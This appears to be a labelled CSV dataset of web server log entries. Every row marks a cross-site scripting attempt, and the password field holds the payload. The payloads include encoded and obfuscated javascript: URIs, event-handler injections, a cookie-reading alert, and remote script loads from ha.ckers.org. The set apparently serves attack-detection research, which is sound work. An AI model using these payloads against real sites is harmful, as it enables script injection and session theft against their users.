,ip_address,date,hour,minute,seconds,protocol,username,password,status,respsize,timed,label
11,192.108.116.88,18/Dec/2017,13,05,16,GET,datalab,"0\autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",200,1040,19,1
12,192.108.116.88,18/Dec/2017,13,05,16,GET,datalab,"0\autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",200,945,4,1
13,192.108.116.88,18/Dec/2017,13,05,16,GET,datalab,"0\autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",200,34463,3,1
14,192.108.116.88,18/Dec/2017,13,05,16,POST,datalab,"0\autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",200,1073,139,1
15,192.108.116.88,18/Dec/2017,13,05,16,GET,datalab,"0\autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",304,-,4,1
16,192.108.116.88,18/Dec/2017,13,05,16,GET,datalab,"0\autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",304,-,9,1
17,192.108.116.88,18/Dec/2017,13,05,38,GET,datalab,"<script/src=data:,alert()>",200,1040,,1
18,192.108.116.88,18/Dec/2017,13,05,38,GET,datalab,"<script/src=data:,alert()>",200,945,,1
19,192.108.116.88,18/Dec/2017,13,05,38,GET,datalab,"<script/src=data:,alert()>",200,34463,,1
20,192.108.116.88,18/Dec/2017,13,05,39,POST,datalab,"<script/src=data:,alert()>",200,1073,,1
21,192.108.116.88,18/Dec/2017,13,05,39,GET,datalab,"<script/src=data:,alert()>",304,-,,1
22,192.108.116.88,18/Dec/2017,13,05,39,GET,datalab,"<script/src=data:,alert()>",304,-,,1
23,192.108.116.88,18/Dec/2017,13,06,03,GET,datalab,<marquee/onstart=alert()>,200,1040,,1
24,192.108.116.88,18/Dec/2017,13,06,03,GET,datalab,<marquee/onstart=alert()>,200,945,,1
25,192.108.116.88,18/Dec/2017,13,06,03,GET,datalab,<marquee/onstart=alert()>,200,34463,,1
26,192.108.116.88,18/Dec/2017,13,06,03,POST,datalab,<marquee/onstart=alert()>,200,1073,,1
27,192.108.116.88,18/Dec/2017,13,06,04,GET,datalab,<marquee/onstart=alert()>,304,-,,1
28,192.108.116.88,18/Dec/2017,13,06,04,GET,datalab,<marquee/onstart=alert()>,304,-,,1
29,192.108.116.88,18/Dec/2017,13,06,26,GET,datalab,<video/poster/onerror=alert()>,200,1040,,1
30,192.108.116.88,18/Dec/2017,13,06,26,GET,datalab,<video/poster/onerror=alert()>,200,945,,1
31,192.108.116.88,18/Dec/2017,13,06,26,GET,datalab,<video/poster/onerror=alert()>,200,34463,,1
32,192.108.116.88,18/Dec/2017,13,06,27,POST,datalab,<video/poster/onerror=alert()>,200,1073,,1
33,192.108.116.88,18/Dec/2017,13,06,27,GET,datalab,<video/poster/onerror=alert()>,304,-,,1
34,192.108.116.88,18/Dec/2017,13,06,27,GET,datalab,<video/poster/onerror=alert()>,304,-,,1
35,192.108.116.88,18/Dec/2017,13,06,45,GET,datalab,<isindex/autofocus/onfocus=alert()>,200,1040,,1
36,192.108.116.88,18/Dec/2017,13,06,45,GET,datalab,<isindex/autofocus/onfocus=alert()>,200,945,,1
37,192.108.116.88,18/Dec/2017,13,06,45,GET,datalab,<isindex/autofocus/onfocus=alert()>,200,34463,,1
38,192.108.116.88,18/Dec/2017,13,06,46,POST,datalab,<isindex/autofocus/onfocus=alert()>,200,1073,,1
39,192.108.116.88,18/Dec/2017,13,06,46,GET,datalab,<isindex/autofocus/onfocus=alert()>,304,-,,1
40,192.108.116.88,18/Dec/2017,13,06,46,GET,datalab,<isindex/autofocus/onfocus=alert()>,304,-,,1
41,192.108.116.88,18/Dec/2017,13,07,06,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,200,1040,,1
42,192.108.116.88,18/Dec/2017,13,07,06,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,200,945,,1
43,192.108.116.88,18/Dec/2017,13,07,06,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,200,34463,,1
44,192.108.116.88,18/Dec/2017,13,07,07,POST,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,200,1073,,1
45,192.108.116.88,18/Dec/2017,13,07,07,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,304,-,,1
46,192.108.116.88,18/Dec/2017,13,07,07,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,304,-,,1
47,192.108.116.88,18/Dec/2017,13,07,24,GET,datalab,"<IMG SRC=javascript:alert('XSS');"">",200,1040,2,1
48,192.108.116.88,18/Dec/2017,13,07,24,GET,datalab,"<IMG SRC=javascript:alert('XSS');"">",200,945,1,1
49,192.108.116.88,18/Dec/2017,13,07,24,GET,datalab,"<IMG SRC=javascript:alert('XSS');"">",200,34463,1,1
50,192.108.116.88,18/Dec/2017,13,09,24,POST,datalab,"<IMG SRC=javascript:alert('XSS');"">",-,-,-,1
51,192.108.116.88,18/Dec/2017,13,11,25,POST,datalab,"<IMG SRC=javascript:alert('XSS');"">",-,-,-,1
52,192.108.116.88,18/Dec/2017,13,11,47,GET,datalab,<IMG SRC=javascript:alert('XSS')>,200,1040,,1
53,192.108.116.88,18/Dec/2017,13,11,47,GET,datalab,<IMG SRC=javascript:alert('XSS')>,200,945,,1
54,192.108.116.88,18/Dec/2017,13,11,47,GET,datalab,<IMG SRC=javascript:alert('XSS')>,200,34463,,1
55,192.108.116.88,18/Dec/2017,13,13,47,POST,datalab,<IMG SRC=javascript:alert('XSS')>,-,-,,1
56,192.108.116.88,18/Dec/2017,13,15,48,POST,datalab,<IMG SRC=javascript:alert('XSS')>,-,-,,1
57,192.108.116.88,18/Dec/2017,13,32,21,GET,datalab,"<IMG SRC=javascript:alert('XSS');"">",200,1040,55,1
58,192.108.116.88,18/Dec/2017,13,32,21,GET,datalab,"<IMG SRC=javascript:alert('XSS');"">",200,945,65,1
59,192.108.116.88,18/Dec/2017,13,32,21,GET,datalab,"<IMG SRC=javascript:alert('XSS');"">",200,34463,59,1
60,192.108.116.88,18/Dec/2017,13,34,21,POST,datalab,"<IMG SRC=javascript:alert('XSS');"">",-,-,-,1
61,192.108.116.88,18/Dec/2017,13,36,21,POST,datalab,"<IMG SRC=javascript:alert('XSS');"">",-,-,-,1
62,192.108.116.88,18/Dec/2017,13,36,46,GET,datalab,<IMG SRC=javascript:alert('XSS')>,200,1040,,1
63,192.108.116.88,18/Dec/2017,13,36,46,GET,datalab,<IMG SRC=javascript:alert('XSS')>,200,945,,1
64,192.108.116.88,18/Dec/2017,13,36,47,GET,datalab,<IMG SRC=javascript:alert('XSS')>,200,34463,,1
65,192.108.116.88,18/Dec/2017,13,38,46,POST,datalab,<IMG SRC=javascript:alert('XSS')>,-,-,,1
66,192.108.116.88,18/Dec/2017,13,40,46,POST,datalab,<IMG SRC=javascript:alert('XSS')>,-,-,,1
67,192.108.116.88,18/Dec/2017,13,41,11,GET,datalab,<IMG SRC=JaVaScRiPt:alert('XSS')>,200,1040,,1
68,192.108.116.88,18/Dec/2017,13,41,11,GET,datalab,<IMG SRC=JaVaScRiPt:alert('XSS')>,200,945,,1
69,192.108.116.88,18/Dec/2017,13,41,11,GET,datalab,<IMG SRC=JaVaScRiPt:alert('XSS')>,200,34463,,1
70,192.108.116.88,18/Dec/2017,13,43,11,POST,datalab,<IMG SRC=JaVaScRiPt:alert('XSS')>,-,-,,1
71,192.108.116.88,18/Dec/2017,13,45,11,POST,datalab,<IMG SRC=JaVaScRiPt:alert('XSS')>,-,-,,1
72,192.108.116.88,18/Dec/2017,13,45,26,GET,datalab,"<IMG SRC=javascript:alert(XSS"")>",200,1040,49,1
73,192.108.116.88,18/Dec/2017,13,45,27,GET,datalab,"<IMG SRC=javascript:alert(XSS"")>",200,945,4,1
74,192.108.116.88,18/Dec/2017,13,45,27,GET,datalab,"<IMG SRC=javascript:alert(XSS"")>",200,34463,10,1
75,192.108.116.88,18/Dec/2017,13,45,28,POST,datalab,"<IMG SRC=javascript:alert(XSS"")>",200,1073,224,1
76,192.108.116.88,18/Dec/2017,13,45,28,GET,datalab,"<IMG SRC=javascript:alert(XSS"")>",304,-,2,1
77,192.108.116.88,18/Dec/2017,13,45,28,GET,datalab,"<IMG SRC=javascript:alert(XSS"")>",304,-,24,1
78,192.108.116.88,18/Dec/2017,13,50,27,GET,datalab,<a onmouseover=alert(document.cookie)>xxs link</a>,200,1040,,1
79,192.108.116.88,18/Dec/2017,13,50,27,GET,datalab,<a onmouseover=alert(document.cookie)>xxs link</a>,200,945,,1
80,192.108.116.88,18/Dec/2017,13,50,27,GET,datalab,<a onmouseover=alert(document.cookie)>xxs link</a>,200,34463,,1
81,192.108.116.88,18/Dec/2017,13,50,28,POST,datalab,<a onmouseover=alert(document.cookie)>xxs link</a>,200,1073,,1
82,192.108.116.88,18/Dec/2017,13,50,28,GET,datalab,<a onmouseover=alert(document.cookie)>xxs link</a>,304,-,,1
83,192.108.116.88,18/Dec/2017,13,50,28,GET,datalab,<a onmouseover=alert(document.cookie)>xxs link</a>,304,-,,1
84,192.108.116.88,18/Dec/2017,13,50,44,GET,datalab,"<IMG ""><SCRIPT>alert(""XSS"")</SCRIPT>"">",200,1040,221,1
85,192.108.116.88,18/Dec/2017,13,50,44,GET,datalab,"<IMG ""><SCRIPT>alert(""XSS"")</SCRIPT>"">",200,945,97,1
86,192.108.116.88,18/Dec/2017,13,50,44,GET,datalab,"<IMG ""><SCRIPT>alert(""XSS"")</SCRIPT>"">",200,34463,74,1
87,192.108.116.88,18/Dec/2017,13,50,45,POST,datalab,"<IMG ""><SCRIPT>alert(""XSS"")</SCRIPT>"">",200,1073,133,1
88,192.108.116.88,18/Dec/2017,13,50,45,GET,datalab,"<IMG ""><SCRIPT>alert(""XSS"")</SCRIPT>"">",304,-,1,1
89,192.108.116.88,18/Dec/2017,13,50,45,GET,datalab,"<IMG ""><SCRIPT>alert(""XSS"")</SCRIPT>"">",304,-,1,1
90,192.108.116.88,18/Dec/2017,13,51,05,GET,datalab,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",200,1040,,1
91,192.108.116.88,18/Dec/2017,13,51,05,GET,datalab,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",200,945,,1
92,192.108.116.88,18/Dec/2017,13,51,05,GET,datalab,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",200,34463,,1
93,192.108.116.88,18/Dec/2017,13,51,06,POST,datalab,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",200,1073,,1
94,192.108.116.88,18/Dec/2017,13,51,06,GET,datalab,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",304,-,,1
95,192.108.116.88,18/Dec/2017,13,51,06,GET,datalab,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",304,-,,1
96,192.108.116.88,18/Dec/2017,13,51,26,GET,datalab,"<IMG SRC=# onmouseover=alert('xxs')"">",200,1040,43,1
97,192.108.116.88,18/Dec/2017,13,51,27,GET,datalab,"<IMG SRC=# onmouseover=alert('xxs')"">",200,945,99,1
98,192.108.116.88,18/Dec/2017,13,51,27,GET,datalab,"<IMG SRC=# onmouseover=alert('xxs')"">",200,34463,14,1
99,192.108.116.88,18/Dec/2017,13,53,27,POST,datalab,"<IMG SRC=# onmouseover=alert('xxs')"">",-,-,-,1
100,192.108.116.88,18/Dec/2017,13,55,27,POST,datalab,"<IMG SRC=# onmouseover=alert('xxs')"">",-,-,-,1
101,192.108.116.88,18/Dec/2017,13,55,41,GET,datalab,"<IMG SRC= onmouseover=alert('xxs')"">",200,1040,39,1
102,192.108.116.88,18/Dec/2017,13,55,41,GET,datalab,"<IMG SRC= onmouseover=alert('xxs')"">",200,945,7,1
103,192.108.116.88,18/Dec/2017,13,55,42,GET,datalab,"<IMG SRC= onmouseover=alert('xxs')"">",200,34463,10,1
104,192.108.116.88,18/Dec/2017,13,57,41,POST,datalab,"<IMG SRC= onmouseover=alert('xxs')"">",-,-,-,1
105,192.108.116.88,18/Dec/2017,13,59,42,POST,datalab,"<IMG SRC= onmouseover=alert('xxs')"">",-,-,-,1
106,192.108.116.88,18/Dec/2017,13,59,57,GET,datalab,"<IMG onmouseover=alert('xxs')"">",200,1040,14,1
107,192.108.116.88,18/Dec/2017,13,59,57,GET,datalab,"<IMG onmouseover=alert('xxs')"">",200,945,3,1
108,192.108.116.88,18/Dec/2017,13,59,58,GET,datalab,"<IMG onmouseover=alert('xxs')"">",200,34463,3,1
109,192.108.116.88,18/Dec/2017,14,01,57,POST,datalab,"<IMG onmouseover=alert('xxs')"">",-,-,-,1
110,192.108.116.88,18/Dec/2017,14,03,58,POST,datalab,"<IMG onmouseover=alert('xxs')"">",-,-,-,1
111,192.108.116.88,18/Dec/2017,14,04,14,GET,datalab,"<IMG SRC=/ onerror=alert(String.fromCharCode(88,83,83))""></img>",200,1040,35,1
112,192.108.116.88,18/Dec/2017,14,04,15,GET,datalab,"<IMG SRC=/ onerror=alert(String.fromCharCode(88,83,83))""></img>",200,945,55,1
113,192.108.116.88,18/Dec/2017,14,04,15,GET,datalab,"<IMG SRC=/ onerror=alert(String.fromCharCode(88,83,83))""></img>",200,34463,4,1
114,192.108.116.88,18/Dec/2017,14,04,15,POST,datalab,"<IMG SRC=/ onerror=alert(String.fromCharCode(88,83,83))""></img>",200,1073,171,1
115,192.108.116.88,18/Dec/2017,14,04,16,GET,datalab,"<IMG SRC=/ onerror=alert(String.fromCharCode(88,83,83))""></img>",304,-,2,1
116,192.108.116.88,18/Dec/2017,14,04,16,GET,datalab,"<IMG SRC=/ onerror=alert(String.fromCharCode(88,83,83))""></img>",304,-,12,1
117,192.108.116.88,18/Dec/2017,14,04,41,GET,datalab,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,200,1040,,1
118,192.108.116.88,18/Dec/2017,14,04,41,GET,datalab,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,200,945,,1
119,192.108.116.88,18/Dec/2017,14,04,41,GET,datalab,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,200,34463,,1
120,192.108.116.88,18/Dec/2017,14,04,42,POST,datalab,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,200,1073,,1
121,192.108.116.88,18/Dec/2017,14,04,42,GET,datalab,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,304,-,,1
122,192.108.116.88,18/Dec/2017,14,04,42,GET,datalab,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,304,-,,1
123,192.108.116.88,18/Dec/2017,14,04,57,GET,datalab,&#39;&#88;&#83;&#83;&#39;&#41;>,200,1040,,1
124,192.108.116.88,18/Dec/2017,14,04,57,GET,datalab,&#39;&#88;&#83;&#83;&#39;&#41;>,200,945,,1
125,192.108.116.88,18/Dec/2017,14,04,57,GET,datalab,&#39;&#88;&#83;&#83;&#39;&#41;>,200,34463,,1
126,192.108.116.88,18/Dec/2017,14,04,58,POST,datalab,&#39;&#88;&#83;&#83;&#39;&#41;>,200,1073,,1
127,192.108.116.88,18/Dec/2017,14,04,58,GET,datalab,&#39;&#88;&#83;&#83;&#39;&#41;>,304,-,,1
128,192.108.116.88,18/Dec/2017,14,04,58,GET,datalab,&#39;&#88;&#83;&#83;&#39;&#41;>,304,-,,1
129,192.108.116.88,18/Dec/2017,14,05,17,GET,datalab,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,200,1040,,1
130,192.108.116.88,18/Dec/2017,14,05,17,GET,datalab,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,200,945,,1
131,192.108.116.88,18/Dec/2017,14,05,17,GET,datalab,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,200,34463,,1
132,192.108.116.88,18/Dec/2017,14,05,18,POST,datalab,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,200,1073,,1
133,192.108.116.88,18/Dec/2017,14,05,19,GET,datalab,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,304,-,,1
134,192.108.116.88,18/Dec/2017,14,05,19,GET,datalab,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,304,-,,1
135,192.108.116.88,18/Dec/2017,14,05,37,GET,datalab,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,200,1040,,1
136,192.108.116.88,18/Dec/2017,14,05,37,GET,datalab,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,200,945,,1
137,192.108.116.88,18/Dec/2017,14,05,37,GET,datalab,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,200,34463,,1
138,192.108.116.88,18/Dec/2017,14,05,38,POST,datalab,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,200,1073,,1
139,192.108.116.88,18/Dec/2017,14,05,38,GET,datalab,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,304,-,,1
140,192.108.116.88,18/Dec/2017,14,05,38,GET,datalab,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,304,-,,1
141,192.108.116.88,18/Dec/2017,14,06,03,GET,datalab,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,200,1040,,1
142,192.108.116.88,18/Dec/2017,14,06,03,GET,datalab,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,200,945,,1
143,192.108.116.88,18/Dec/2017,14,06,03,GET,datalab,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,200,34463,,1
144,192.108.116.88,18/Dec/2017,14,06,04,POST,datalab,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,200,1073,,1
145,192.108.116.88,18/Dec/2017,14,06,04,GET,datalab,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,304,-,,1
146,192.108.116.88,18/Dec/2017,14,06,04,GET,datalab,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,304,-,,1
147,192.108.116.88,18/Dec/2017,14,06,31,GET,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",200,1040,1,1
148,192.108.116.88,18/Dec/2017,14,06,31,GET,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",200,945,1,1
149,192.108.116.88,18/Dec/2017,14,06,31,GET,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",200,34463,2,1
150,192.108.116.88,18/Dec/2017,14,06,32,POST,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",200,1073,167,1
151,192.108.116.88,18/Dec/2017,14,06,33,GET,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",304,-,0,1
152,192.108.116.88,18/Dec/2017,14,06,33,GET,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",304,-,0,1
153,192.108.116.88,18/Dec/2017,14,06,57,GET,datalab,"<IMG SRC=jav&#x09;ascript:alert('XSS');"">",200,1040,12,1
154,192.108.116.88,18/Dec/2017,14,06,57,GET,datalab,"<IMG SRC=jav&#x09;ascript:alert('XSS');"">",200,945,6,1
155,192.108.116.88,18/Dec/2017,14,06,57,GET,datalab,"<IMG SRC=jav&#x09;ascript:alert('XSS');"">",200,34463,4,1
156,192.108.116.88,18/Dec/2017,14,08,57,POST,datalab,"<IMG SRC=jav&#x09;ascript:alert('XSS');"">",-,-,-,1
157,192.108.116.88,18/Dec/2017,14,10,58,POST,datalab,"<IMG SRC=jav&#x09;ascript:alert('XSS');"">",-,-,-,1
158,192.108.116.88,18/Dec/2017,14,11,17,GET,datalab,"<IMG SRC=jav&#x0A;ascript:alert('XSS');"">",200,1040,3,1
159,192.108.116.88,18/Dec/2017,14,11,17,GET,datalab,"<IMG SRC=jav&#x0A;ascript:alert('XSS');"">",200,945,12,1
160,192.108.116.88,18/Dec/2017,14,11,17,GET,datalab,"<IMG SRC=jav&#x0A;ascript:alert('XSS');"">",200,34463,1,1
161,192.108.116.88,18/Dec/2017,14,13,17,POST,datalab,"<IMG SRC=jav&#x0A;ascript:alert('XSS');"">",-,-,-,1
162,192.108.116.88,18/Dec/2017,14,15,17,POST,datalab,"<IMG SRC=jav&#x0A;ascript:alert('XSS');"">",-,-,-,1
163,192.108.116.88,18/Dec/2017,14,15,36,GET,datalab,"<IMG SRC=jav&#x0D;ascript:alert('XSS');"">",200,1040,27,1
164,192.108.116.88,18/Dec/2017,14,15,36,GET,datalab,"<IMG SRC=jav&#x0D;ascript:alert('XSS');"">",200,945,22,1
165,192.108.116.88,18/Dec/2017,14,15,36,GET,datalab,"<IMG SRC=jav&#x0D;ascript:alert('XSS');"">",200,34463,3,1
166,192.108.116.88,18/Dec/2017,14,17,36,POST,datalab,"<IMG SRC=jav&#x0D;ascript:alert('XSS');"">",-,-,-,1
167,192.108.116.88,18/Dec/2017,14,19,36,POST,datalab,"<IMG SRC=jav&#x0D;ascript:alert('XSS');"">",-,-,-,1
168,192.108.116.88,18/Dec/2017,14,24,13,GET,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,1040,31,1
169,192.108.116.88,18/Dec/2017,14,24,13,GET,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,945,41,1
170,192.108.116.88,18/Dec/2017,14,24,13,GET,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,34463,13,1
171,192.108.116.88,18/Dec/2017,14,24,14,POST,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,1073,218,1
172,192.108.116.88,18/Dec/2017,14,24,14,GET,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",304,-,5,1
173,192.108.116.88,18/Dec/2017,14,24,14,GET,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",304,-,5,1
174,192.108.116.88,18/Dec/2017,14,24,33,GET,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",200,1040,1,1
175,192.108.116.88,18/Dec/2017,14,24,33,GET,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",200,945,17,1
176,192.108.116.88,18/Dec/2017,14,24,33,GET,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",200,34463,3,1
177,192.108.116.88,18/Dec/2017,14,24,34,POST,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",200,1073,158,1
178,192.108.116.88,18/Dec/2017,14,24,34,GET,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",304,-,1,1
179,192.108.116.88,18/Dec/2017,14,24,34,GET,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",304,-,10,1
180,192.108.116.88,18/Dec/2017,14,24,50,GET,datalab,"<SCRIPT/SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,1040,4,1
